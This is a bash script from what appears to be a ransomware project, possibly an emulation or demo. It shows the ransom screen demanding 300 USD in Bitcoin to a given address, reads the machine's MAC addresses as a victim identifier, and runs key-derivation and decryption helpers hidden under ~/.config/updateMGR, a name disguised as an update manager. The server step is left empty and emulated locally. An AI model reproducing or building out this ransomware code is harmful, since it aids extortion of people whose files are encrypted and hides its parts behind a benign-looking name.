#!/bin/bash
export DISPLAY=:0.0
echo "All your files are encrypted, To Proceed with decryption, you have to pay to";
echo "0x70C792E7A1F2Dd157976dDB1bEf29B6614B0d520";
echo "BitCoin Worth 300 USD, On sucessfull payment ";
echo "  Press 1: To obtain Decryption Key (within 48 hrs of payment), then";
echo "  Press 2: To use Decryption Key to decrypt files";
echo -n "Enter Choice Key: ";
read input_dec_key     
if [[ $input_dec_key -eq "1" ]]; then
    # mkdir "/home/$(whoami)/.config/updateMGR/Log/user_wants_decryption_key"
    echo "THe following ccode will run on server, but for emulation it is shown here"
    echo -n "Enter Transaction Hash:"
    read transaction_hash
    user_pc_identifier=`cat /sys/class/net/*/address| tr '\n' ':'`
    echo "This Hash Will be sent to server and if valid(Present in server's database)"
    echo "It will return Decryption key (using unique identifier of PC)"
    ######### Server code to send and recieve info to server starts here ##############
    ######### Server code to send and recieve info to server ends here   ##############
    echo "To emulate above process in local PC, We are giving decryption key without validating the Transaction Hash"
    ######### Local emulation of Above process #########
    enc_key_intermediate=`python3 /home/$(whoami)/.config/updateMGR/prf_server_code.py $user_pc_identifier`
    enc_key_=`echo $enc_key_intermediate | sha256sum | cut -d ' ' -f 1`'='
    echo "Decryption key is: "$enc_key_
    /home/$(whoami)/.config/updateMGR/decrypter.sh
elif [[ $input_dec_key -eq "2" ]]; then
    mkdir "/home/$(whoami)/.config/updateMGR/Log/user_directly_went_for_decryption"
    /home/$(whoami)/.config/updateMGR/decrypter.sh
else 
    echo "Invalid Input"
fi
#Files are already encrypted, so call decrypt file
                